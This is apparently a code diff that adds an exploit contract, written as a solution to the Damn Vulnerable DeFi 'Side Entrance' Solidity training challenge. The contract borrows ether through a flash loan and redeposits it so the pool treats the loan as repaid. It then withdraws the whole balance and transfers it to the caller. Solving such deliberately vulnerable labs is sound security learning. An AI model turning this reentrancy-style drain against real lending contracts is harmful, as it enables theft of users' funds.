@@ -36,3 +36,27 @@ contract SideEntranceLenderPool {
     }
 }
  
+/**
+ * @title AttackerContract
+ * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ */
+contract AttackerContract is IFlashLoanEtherReceiver {
+
+    address owner;
+    constructor() {
+        owner = msg.sender;
+    }
+    function execute() external payable override{
+        SideEntranceLenderPool pool = SideEntranceLenderPool(msg.sender);
+        pool.deposit{value: address(this).balance}();
+    }
+
+    function getBread(address poolAddress, uint256 amount) external {
+        SideEntranceLenderPool pool = SideEntranceLenderPool(poolAddress);
+        pool.flashLoan(amount);
+        pool.withdraw();
+        payable(msg.sender).transfer(address(this).balance);
+    }
+
+    receive() external payable {}
+}
